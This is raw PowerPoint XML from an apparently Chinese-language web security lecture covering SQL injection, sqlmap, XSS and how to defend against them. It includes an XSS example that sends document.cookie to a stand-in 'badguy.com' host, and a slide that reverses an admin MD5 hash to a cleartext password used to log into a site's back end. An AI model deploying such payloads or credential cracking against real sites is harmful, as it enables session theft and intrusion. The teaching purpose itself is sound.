            <a:endParaRPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>md5</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>反查 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(http://www.cmd5.com/)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>，得到该</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>password</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>散列的原文密码为</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>”0791idc”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="zh-CN" dirty="0"/>
              <a:t>。 拿到管理员账号密码直接成功登录网站后台</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="标题 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0" err="1"/>
              <a:t>Sqlmap</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="图片 3" descr="5"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1936432" y="1309052"/>
            <a:ext cx="5271135" cy="423989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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>防御注入漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="449539" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="658812" y="1392238"/>
            <a:ext cx="7951787" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>特定语言的库函数</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>来代替</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>命令和系统调用；</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>对用户输入的信息进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>严格检查和过滤</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据类型（字符串、整数等）正确吗？ </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用的是允许的字符集吗？ </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>输入满足格式要求吗？ </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>……</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>使用“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>最小权限</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>”限制数据库用户的权限</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9539">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4495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95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9539">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4495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95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49539">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4495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95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9539">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4495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95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49539">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="31" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4495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95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49539">
                                            <p:txEl>
                                              <p:pRg st="5" end="5"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="37" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44953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95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49539">
                                            <p:txEl>
                                              <p:pRg st="6" end="6"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="43" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="44953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4953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二、跨站脚本攻击及防范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r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>一</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>跨站脚本（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431107" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1916113"/>
            <a:ext cx="8229600" cy="3798887"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>    Cross-Site Scripting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> (XSS) flaws occur whenever an application takes user supplied data and sends it to a web browser without first validating or encoding that content. XSS allows attackers to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>execute script in the victim's browser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> which can hijack user sessions, deface web sites, possibly introduce worms, etc.</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="431108" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="611188" y="131127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1107">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="blinds(horizontal)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="4311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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>跨站脚本攻击</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412675" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="477838" y="1306513"/>
            <a:ext cx="8229600" cy="1150937"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>工作原理： 输入插入包含有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>或其它恶意脚本的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>标签代码。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412676" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="4149725"/>
            <a:ext cx="8229600" cy="1871663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:noFill/>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>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800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>问题根源：不当的服务器端输入检查，从而允许用户输入可被客户端浏览器解释的脚本命令。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="10000"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="FF0000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>最普遍</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
              </a:rPr>
              <a:t>程序安全问题。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="黑体" panose="02010609060101010101" pitchFamily="49" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="412677" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="2422525"/>
            <a:ext cx="7416800" cy="1511300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFF99"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
          </a:ln>
          <a:effectLst/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="90000" tIns="46800" rIns="90000" bIns="46800" anchor="ctr">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>嵌入</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>JavaScript </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>脚本的例子：</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" b="1">
              <a:solidFill>
                <a:srgbClr val="0000FF"/>
              </a:solidFill>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>&lt;script&gt; </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>        window.open( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>http://badguy.com/info.pl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>?document.cookie </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" b="1">
              <a:solidFill>
                <a:srgbClr val="00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2675">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="412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2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2677"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="412677"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="14" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="41267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2676">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="41267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267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2676">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="25" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="41267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267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6018" name="Picture 34" descr="图片1"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1" cstate="print"/>
          <a:srcRect/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2268538" y="3932238"/>
            <a:ext cx="3598862" cy="2089150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="426017" name="Picture 33" descr="图片1"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1" noChangeArrowheads="1"/>
          </p:cNvPicPr>
